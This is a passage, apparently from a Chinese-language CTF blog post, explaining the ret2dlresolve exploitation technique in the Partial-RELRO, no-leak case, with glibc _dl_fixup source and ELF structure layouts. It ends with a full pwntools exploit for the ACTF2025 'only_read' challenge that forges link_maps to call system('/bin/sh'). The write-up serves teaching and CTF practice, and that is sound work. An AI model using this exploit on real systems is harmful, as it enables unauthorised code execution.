l-&gt;l_scope,            </span><br><span class="line">                                     version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);            </span><br><span class="line">        <span class="comment">/* We are done with the global scope.  */</span>                                           </span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)                                                          </span><br><span class="line">            THREAD_GSCOPE_RESET_FLAG();                                                     </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL                                                           </span></span><br><span class="line">        RTLD_FINALIZE_FOREIGN_CALL;                                                         </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>                                                                                      </span></span><br><span class="line">                                                                                            </span><br><span class="line">     <span class="comment">/* Currently result contains the base load address (or link map)                       </span></span><br><span class="line"><span class="comment">     of the object that defines sym.  Now add in the symbol                                 </span></span><br><span class="line"><span class="comment">     offset.  */</span>                                                                            </span><br><span class="line">         <span class="comment">// 基于查询到的 link_map 计算符号的绝对地址: result-&gt;l_addr + sym-&gt;st_value       </span></span><br><span class="line">        <span class="comment">// l_addr 为待解析函数所在文件的基地址                                             </span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,                                                  </span><br><span class="line">                   sym ? (LOOKUP_VALUE_ADDRESS (result)                                     </span><br><span class="line">                      + sym-&gt;st_value) : <span class="number">0</span>);                                                </span><br><span class="line">    &#125;                                                                                       </span><br><span class="line">  <span class="keyword">else</span><span class="comment">//我们的目标是进入到else分支！                                                                                      </span></span><br><span class="line">    &#123;                                                                                       </span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load                   </span></span><br><span class="line"><span class="comment">     address) is also known.  */</span>                                                            </span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);                           </span><br><span class="line">      result = l;                                                                           </span><br><span class="line">    &#125;                 </span><br><span class="line">    <span class="comment">// ......   </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么此时我们仅需要在构造<code>Elf_Sym</code>结构体时将<code>Elf_Sym-&gt;st_other</code>设置为非0即可绕开，进入else分支。</p><p><code>Elf_Sym-&gt;st_other</code>定义如下，实际上设置为非0即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌─┬──────────────────────────────────────────────────────────────────────────────────┐</span><br><span class="line">│<span class="number">1</span>│<span class="comment">/* How to extract and insert information held in the st_other field.  */</span>          │</span><br><span class="line">│<span class="number">2</span>│<span class="meta">#<span class="keyword">define</span> ELF32_ST_VISIBILITY(o)        ((o) &amp; 0x03)                                │</span></span><br><span class="line">│<span class="number">3</span>│<span class="comment">/* For ELF64 the definitions are the same.  */</span>                                    │</span><br><span class="line">│<span class="number">4</span>│<span class="meta">#<span class="keyword">define</span> ELF64_ST_VISIBILITY(o)        ELF32_ST_VISIBILITY (o)                     │</span></span><br><span class="line">│<span class="number">5</span>│<span class="comment">/* Symbol visibility specification encoded in the st_other field.  */</span>             │</span><br><span class="line">│<span class="number">6</span>│<span class="meta">#<span class="keyword">define</span> STV_DEFAULT        0                <span class="comment">/* Default symbol visibility rules */</span> │</span></span><br><span class="line">│<span class="number">7</span>│<span class="meta">#<span class="keyword">define</span> STV_INTERNAL       1                <span class="comment">/* Processor specific hidden class */</span> │</span></span><br><span class="line">│<span class="number">8</span>│<span class="meta">#<span class="keyword">define</span> STV_HIDDEN         2                <span class="comment">/* Sym unavailable in other modules */</span>│</span></span><br><span class="line">│<span class="number">9</span>│<span class="meta">#<span class="keyword">define</span> STV_PROTECTED      3                <span class="comment">/* Not preemptible, not exported */</span>   │</span></span><br><span class="line">└─┴──────────────────────────────────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure><p>这两个分支的区别无非在于当前查询的符号知否是已知的</p><ol><li>若不是已知的则找到待解析函数所在文件的<code>link_map</code>，然后取出<code>l_addr</code>再计算.</li><li>若是已知的则直接拿<code>l</code>的<code>l_addr</code>进行计算。</li></ol><p>进入else分支之后，我们地址的计算方式变更为<code>value = l-&gt;l_addr + sym-&gt;st_value</code>。</p><p>那么因为原来<code>libc</code>中的<code>link_map</code>地址未知，则该<code>link_map</code>的<code>l_addr</code>值我们没有办法改变，那么如果我们能“另起炉灶”，构造一个新的的<code>link_map</code>呢？</p><p>我们构造的<code>link_map</code>要使得其：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">l_addr = RVA(func A) - RVA(func B)</span><br></pre></td></tr></table></figure><p>其中<code>func A</code>为我们想要解析的函数，如<code>system</code>，<code>execve</code>,<code>func B</code>为当前程序已经解析的函数，如<code>__libc_start_main</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">type = <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">/*    0      |     4 */</span>    Elf32_Word st_name;</span><br><span class="line"><span class="comment">/*    4      |     4 */</span>    Elf32_Addr st_value;</span><br><span class="line"><span class="comment">/*    8      |     4 */</span>    Elf32_Word st_size;</span><br><span class="line"><span class="comment">/*   12      |     1 */</span>    <span class="type">unsigned</span> <span class="type">char</span> st_info;</span><br><span class="line"><span class="comment">/*   13      |     1 */</span>    <span class="type">unsigned</span> <span class="type">char</span> st_other;</span><br><span class="line"><span class="comment">/*   14      |     2 */</span>    Elf32_Section st_shndx;</span><br><span class="line"></span><br><span class="line">                           <span class="comment">/* total size (bytes):   16 */</span></span><br><span class="line">&#125;Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="comment">/*    0      |     4 */</span>    Elf64_Word st_name;</span><br><span class="line"><span class="comment">/*    4      |     1 */</span>    <span class="type">unsigned</span> <span class="type">char</span> st_info;</span><br><span class="line"><span class="comment">/*    5      |     1 */</span>    <span class="type">unsigned</span> <span class="type">char</span> st_other;</span><br><span class="line"><span class="comment">/*    6      |     2 */</span>    Elf64_Section st_shndx;</span><br><span class="line"><span class="comment">/*    8      |     8 */</span>    Elf64_Addr st_value;</span><br><span class="line"><span class="comment">/*   16      |     8 */</span>    Elf64_Xword st_size;</span><br><span class="line"></span><br><span class="line">                           <span class="comment">/* total size (bytes):   24 */</span></span><br><span class="line">&#125;Elf64_Sym;</span><br></pre></td></tr></table></figure><p>然后我们再在在<code>got表</code>附近“构造”的<code>Elf_Sym</code>结构体，准确地说是恰好让结构体中的<code>st_value</code>的区域和<code>func B</code>的<code>got表项</code>重合，即借用<code>GOT表项</code>，那么此时(假设为64位)的<code>Elf_Sym</code>中的<code>st_name</code>和<code>st_other</code>字段将与<code>func B</code>的上一个GOT表项重合。</p><p>构造示意图如下：</p><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/ret2dlresolve--4.Partial-RELRO.No-Leak.png" alt="ret2dlresolve--4.Partial-RELRO.No-Leak"></p><p><strong>那么我们为什么要这么构造呢？</strong></p><p>此时解析出来的<code>value</code>则为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RVA:相对虚拟地址，即函数虚拟地址相对于所处文件的加载基址的差</span></span><br><span class="line"><span class="comment">// VA: 虚拟地址，即函数加载到程序空间中的虚拟地址</span></span><br><span class="line">value = l-&gt;l_addr + sym-&gt;st_value</span><br><span class="line">      = ( RVA(func A) - RVA(func B) ) + VA(func B)</span><br><span class="line">      = RVA(func A) + (VA(func B) - RVA(func B))</span><br><span class="line">      = RVA(func A) + Libc_base</span><br><span class="line">      = VA(func A)</span><br></pre></td></tr></table></figure><p><code>dl_fixup</code>得出的结果<code>value</code> “正好”是我们所需要的地址，即<code>dl_fixup</code>成功“计算出”了我们想要的恶意函数A的地址，那么接下来<code>dl_runtime_resolve</code>就会调用该地址所在的函数，目的达成。</p><p>而让伪造的<code>Elf_Sym</code>结构体落在<code>GOT表</code>附近是非常简单的，只需要在我们伪造<code>Elf_Dyn</code>时（希望读者没有忘记，这个结构体是保存各个节基址的键值对），将关键字<code>DT_SYMTAB</code>的值指向GOT表附近即可。</p><p>那么如果我们要保证<code>st_other</code>不为0，那么在64位下，需要<code>func B</code>的<code>got表项</code>的上一项必须已经初始化，并且第6个字节(索引为5)不为0，否则<code>st_other</code>还是0，没法走到else分支；</p><p>庆幸的是，64位下的GOT表项一般初始化后的的值类似于<code>0x7feefa1c6000</code>之类的值，即第6个字节为<code>0x7f</code>，那么此时我们的<code>st_other</code>不为0，满足条件。</p><p>同理，若想在32位下进行攻击，则需要保证<code>func B</code>的<code>got表项</code>的 <strong>下两项</strong> 已经初始化且该项的第2个字节(索引为1)不为0。</p><p>（32位和64位要求不同的根本原因就是<code>Elf32_Sym</code>和<code>Elf64_Sym</code>的字段顺序不同）</p><h5 id="2-3-2-利用"><a href="#2-3-2-利用" class="headerlink" title="2.3.2 利用"></a>2.3.2 利用</h5><p>我们需要伪造我们自己的<code>link_map</code>，并将这些指针中的关键的部分指向我们<code>link_map</code>内部或者上述的<code>GOT表项</code>以减少<code>payload</code>大小，毕竟再一次地，可控区域一般情况下有限，<code>payload</code>越短越好。那么此时<strong>我们可以简单化地将各类节和条目之前的偏移设置为0</strong>（如<code>offset</code>，<code>r_info</code>中的<code>index</code>，一是方便计算，二是可以紧凑得压缩payload长度。</p><p>至此我们可以得出以下的构造方式（方式不唯一，知道原理即可得出自己的构造方式）：</p><p>[<img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/ret2dlresolve--4.Partial-RELRO.No-Leak.2.png" alt="ret2dlresolve--4.Partial-RELRO.No-Leak.2"></p><p>下面以ACTF2025的Read——only来举例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">text:0000000000401136                 endbr64</span><br><span class="line">.text:000000000040113A                 push    rbp</span><br><span class="line">.text:000000000040113B                 mov     rbp, rsp</span><br><span class="line">.text:000000000040113E                 add     rsp, 0FFFFFFFFFFFFFF80h</span><br><span class="line">.text:0000000000401142                 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000401146                 mov     edx, 800h       ; nbytes</span><br><span class="line">.text:000000000040114B                 mov     rsi, rax        ; buf</span><br><span class="line">.text:000000000040114E                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000401153                 call    _read</span><br><span class="line">.text:0000000000401158                 mov     eax, 0</span><br><span class="line">.text:000000000040115D                 leave</span><br><span class="line">.text:000000000040115E                 retn</span><br></pre></td></tr></table></figure><p>核心代码就这么多，题目的话是没有给到pop_rdi_ret这个gadget，那么同理我们可以把这个gadget当作一个函数解析，我们就需要伪造两个link_map，一个是pop_rdi_ret一个是system</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">#context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span><br><span class="line"></span><br><span class="line">def forge_linkmap(linkmap_addr, known_libc_RVA, call_libc_RVA, known_elf_got_VA, bss_base, custom_data=b&quot;/bin/sh\x00&quot;):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    - linkmap_addr: VA where fake link_map will be placed (e.g. bss + 0x100)</span><br><span class="line">    - known_libc_RVA: RVA of a known libc symbol (e.g. libc.sym[&#x27;read&#x27;])</span><br><span class="line">    - call_libc_RVA: RVA of the libc symbol we want to compute VA for (e.g. system or arbitrary rdi_offset)</span><br><span class="line">    - known_elf_got_VA: VA of a GOT entry to overlap with Elf64_Sym.st_value (e.g. elf.got[&#x27;read&#x27;])</span><br><span class="line">    - bss_base: the bss base used in exploit (used to compute r_offset same as working script)</span><br><span class="line">    - custom_data: bytes to place into fake area (by default &quot;/bin/sh\x00&quot;)</span><br><span class="line">    Returns: (fake_link_map_bytes, addr_of_custom_data_if_placed_else_0)</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    assert isinstance(custom_data, bytes)</span><br><span class="line"></span><br><span class="line">    # compute l_addr = RVA(funcA) - RVA(funcB)</span><br><span class="line">    l_addr = call_libc_RVA - known_libc_RVA</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    r_offset = bss_base + (-l_addr)</span><br><span class="line">    success(hex(-l_addr))</span><br><span class="line"></span><br><span class="line">    fake_link_map_addr = linkmap_addr</span><br><span class="line">    fake_dyn_strtab_addr = fake_link_map_addr + 0x08</span><br><span class="line">    fake_dyn_symtab_addr = fake_link_map_addr + 0x18</span><br><span class="line">    fake_dyn_rel_addr = fake_link_map_addr + 0x28</span><br><span class="line"></span><br><span class="line">    head = flat([</span><br><span class="line">        l_addr,</span><br><span class="line">        0, 0xdeadbeef,</span><br><span class="line">        0, (known_elf_got_VA - 8),</span><br><span class="line">        0, (fake_link_map_addr + 0x38),</span><br><span class="line">        r_offset, 7</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    tail = flat([</span><br><span class="line">        fake_dyn_strtab_addr,</span><br><span class="line">        fake_dyn_symtab_addr,</span><br><span class="line">        custom_data.ljust(0x80, b&quot;\x00&quot;),</span><br><span class="line">        fake_dyn_rel_addr</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    fake_link_map = head.ljust(0x68, b&quot;\x00&quot;) + tail</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    custom_data_addr = fake_link_map_addr + 0x68 + 0x10</span><br><span class="line"></span><br><span class="line">    return fake_link_map, custom_data_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    sh = process(&quot;./only_read&quot;)</span><br><span class="line">    elf = ELF(&quot;./only_read&quot;)</span><br><span class="line">    libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    leave_ret = 0x40115d</span><br><span class="line">    read = 0x401142</span><br><span class="line">    _dl_runtime_resolve_addr = 0x401026</span><br><span class="line">    bss = elf.bss(0xA08)</span><br><span class="line">    stage_offset = 0x80</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload1 = flat([</span><br><span class="line">        cyclic(0x80),</span><br><span class="line">        bss + stage_offset, #注意这里输入是在bss上，但栈迁移实际上迁移到了bss + stage_offset的位置</span><br><span class="line">        read,</span><br><span class="line">    ])</span><br><span class="line">    sh.send(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    rdi_offset = 0x10f75b</span><br><span class="line">    fake_inkmap_addr1 = bss + 0x100</span><br><span class="line">    fake_inkmap1, custom_data_addr1 = forge_linkmap(</span><br><span class="line">        linkmap_addr=fake_inkmap_addr1,</span><br><span class="line">        known_libc_RVA=libc.sym[&#x27;read&#x27;],</span><br><span class="line">        call_libc_RVA=rdi_offset,</span><br><span class="line">        known_elf_got_VA=elf.got[&#x27;read&#x27;],</span><br><span class="line">        bss_base=bss,</span><br><span class="line">        custom_data=b&quot;/bin/sh\x00&quot;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fake_inkmap_addr2 = bss + 0x200</span><br><span class="line">    fake_inkmap2, custom_data_addr2 = forge_linkmap(</span><br><span class="line">        linkmap_addr=fake_inkmap_addr2,</span><br><span class="line">        known_libc_RVA=libc.sym[&#x27;read&#x27;],</span><br><span class="line">        call_libc_RVA=libc.sym[&#x27;system&#x27;],</span><br><span class="line">        known_elf_got_VA=elf.got[&#x27;read&#x27;],</span><br><span class="line">        bss_base=bss,</span><br><span class="line">        custom_data=b&quot;/bin/sh\x00&quot;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload2 = flat([</span><br><span class="line">        _dl_runtime_resolve_addr,</span><br><span class="line">        fake_inkmap_addr1, 0,</span><br><span class="line">        custom_data_addr1,</span><br><span class="line">        _dl_runtime_resolve_addr,</span><br><span class="line">        fake_inkmap_addr2, 0,</span><br><span class="line">    ])</span><br><span class="line">    payload2 = payload2.ljust(0x80, b&quot;\x00&quot;)</span><br><span class="line">    payload2 += flat([bss - 8,leave_ret]) #校准rsp指向我们输入的bss</span><br><span class="line">    payload2 = payload2.ljust(0x100, b&quot;\x00&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload2 += fake_inkmap1</span><br><span class="line">    payload2 += fake_inkmap2</span><br><span class="line">#    gdb.attach(sh)</span><br><span class="line">    sh.send(payload2)</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
